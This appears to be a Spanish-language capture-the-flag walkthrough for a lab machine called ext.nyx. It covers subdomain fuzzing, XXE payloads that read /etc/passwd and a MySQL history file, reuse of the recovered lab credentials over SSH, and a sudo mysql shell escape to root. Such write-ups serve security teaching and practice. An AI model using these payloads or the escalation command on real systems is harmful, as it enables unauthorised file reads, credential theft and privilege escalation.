Hacemos el reconocimiento con nmap:
![[Pasted image 20230926104210.png]]
Y en el puerto 80 vemos que no hay nada aparentemente:
![[Pasted image 20230926104349.png]]
Pero si vemos el código fuente nos encontramos con esto:
![[Pasted image 20230926104410.png]]
Añadimos el dominio en el /etc/host:
![[Pasted image 20230926104535.png]]
Y hacemos búsqueda de subdominios:
```bash
wfuzz -c -t 200 --hl 75 -w subdomains-top1million-110000.txt -H "Host: FUZZ.ext.nyx" http://ext.nyx
```
O con gobuster:
```bash
gobuster vhost -u http://ext.nyx -w subdomains-top1million-110000.txt | grep -v '400'
```
Y tenemos el subdominio administrator:
![[Pasted image 20230926105521.png]]
Lo añadimos al /etc/hosts y deberíamos poder acceder a él desde el navegador:
![[Pasted image 20230926105704.png]]
![[Pasted image 20230926105714.png]]
Ponemos unas credenciales aleatorias e interceptamos con burp suite la petición, donde vemos que poder estar ante un XML External Entity:
![[Pasted image 20230926105854.png]]
Le ponemos el siguiente payload basándonos en el que viene por defecto:
```bash
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY prueba SYSTEM "file:///etc/passwd"> ]>
<details>
<email>
&prueba;
</email>
<password>1234</password>
</details>
```
Vemos que hay un usuario llamado mysql:
![[Pasted image 20230926124527.png]]
Por lo que podemos intentar apuntar contra el mysql.history:
```bash
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY prueba SYSTEM "file:///home/admin/.mysql_history"> ]>
<details>
<email>
&prueba;
</email>
<password>1234</password>
</details>
```
![[Pasted image 20230926124604.png]]
Y tenemos las siguientes credenciales:
```bash
root:r00tt00rDB
```
Iniciamos sesión con estas credenciales y vemos que funciona bien:
![[Pasted image 20230926125018.png]]
![[Pasted image 20230926125032.png]]
Y vemos la contraseña del usuario admin:
![[Pasted image 20230926125108.png]]
```bash
admin:4dminDBS3cur3P4ssw0rd123
```
Y con esta contraseña entramos correctamente por ssh:
![[Pasted image 20230926125555.png]]
Y si ejecutamos el comando sudo -l vemos cómo podemos ejecutar como sudo mysql:
![[Pasted image 20230926125756.png]]
Buscamos en gtfobins como explotar esto y lo hacemos, pero nos pedirá que pongamos la contraseña de la base de datos nuevamente:
```bash
sudo /usr/bin/mysql -e '\! /bin/sh' -p
r00tt00rDB
```
![[Pasted image 20230926125910.png]]
